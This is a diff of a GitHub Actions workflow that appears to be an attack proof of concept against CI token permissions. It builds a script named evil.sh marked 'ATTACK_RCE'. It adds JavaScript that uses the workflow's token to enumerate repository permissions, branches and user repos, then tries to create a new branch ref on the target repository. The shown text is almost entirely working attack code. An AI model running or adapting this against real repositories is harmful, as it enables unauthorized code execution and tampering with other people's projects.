@@ -10,8 +10,7 @@ jobs:
       - name: build
         run: |
           mkdir -p out
-          printf '%s' "${{ github.event.number }}" > out/pr_number.txt
-          printf 'attack-readme\n' > out/readme.txt
+          printf 'no-pr-number\n' > out/readme.txt
           cat > out/evil.sh <<'SH'
           #!/bin/bash
           echo "=== ATTACK_RCE_BEGIN ==="
@@ -55,6 +54,14 @@ jobs:
               log('wf_default_perms status=' + x.s + ' default=' + (x.j && x.j.default_workflow_permissions) + ' msg=' + (x.j && x.j.message));
               x = await call('GET', '/repos/' + repo + '/branches');
               log('branches status=' + x.s + ' n=' + (Array.isArray(x.j) ? x.j.length : x.j && x.j.message));
+              x = await call('GET', '/repos/' + repo + '/git/ref/heads/main');
+              const headsha = x.j && x.j.object && x.j.object.sha;
+              log('main_ref status=' + x.s + ' sha=' + headsha + ' msg=' + (x.j && x.j.message));
+              if (headsha) {
+                const refname = 'refs/heads/probe-' + process.env.GITHUB_RUN_ID;
+                x = await call('POST', '/repos/' + repo + '/git/refs', { ref: refname, sha: headsha });
+                log('create_ref ' + refname + ' status=' + x.s + ' msg=' + (x.j && x.j.message));
+              }
               x = await call('GET', '/user/repos?per_page=100');
               log('user_repos status=' + x.s + ' n=' + (Array.isArray(x.j) ? x.j.length : ''));
               let pr = '';
